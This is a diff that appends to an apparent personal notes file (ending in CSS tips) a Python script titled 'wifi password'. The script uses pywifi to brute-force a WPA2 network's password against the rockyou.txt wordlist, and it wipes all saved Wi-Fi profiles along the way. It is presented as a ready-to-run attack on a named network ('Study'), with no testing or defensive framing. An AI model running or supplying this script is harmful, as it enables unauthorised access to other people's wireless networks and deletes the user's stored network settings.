@@ -3517,3 +3517,54 @@ Use classes for reusable styles: Classes are more flexible and promote consisten
 Avoid over-specificity: Using too many IDs can lead to overly specific CSS, making it harder to override styles later.
 
 In most cases, classes (.) are preferred because they are more flexible and reusable. Use IDs (#) only when you need to target a single, unique element.'''
+
+
+'''wifi password'''
+
+import time
+import pywifi
+from pywifi import const, Profile
+
+def connect_to_wifi(ssid, password):
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]  # Select the first Wi-Fi interface
+
+    iface.disconnect()
+    time.sleep(1)  # Wait a bit before trying to connect
+
+    profile = Profile()
+    profile.ssid = ssid  # Set the network name
+    profile.auth = const.AUTH_ALG_OPEN  # Open authentication
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2 security type
+    profile.cipher = const.CIPHER_TYPE_CCMP  # Encryption type
+    profile.key = password.strip()  # Set the password
+
+    iface.remove_all_network_profiles()  # Remove existing profiles
+    new_profile = iface.add_network_profile(profile)  # Add new profile
+
+    iface.connect(new_profile)  # Try connecting
+    time.sleep(5)  # Wait for connection
+
+    if iface.status() == const.IFACE_CONNECTED:
+        print(f"\n[+] Successfully connected to {ssid} with password: {password}")
+        return True
+    else:
+        print(f"[-] Failed: {password}")
+        return False
+
+def brute_force_wifi(ssid, wordlist_path):
+    with open(wordlist_path, "r", encoding="latin-1") as file:  # Open wordlist
+        for password in file:
+            password = password.strip()  # Remove newline characters
+            if connect_to_wifi(ssid, password):
+                break  # Stop if password is correct
+
+# Example usage
+ssid = "Study"
+wordlist_path = "C:/Users/user/Downloads/rockyou.txt"
+ 
+
+brute_force_wifi(ssid, wordlist_path)
+
+
+
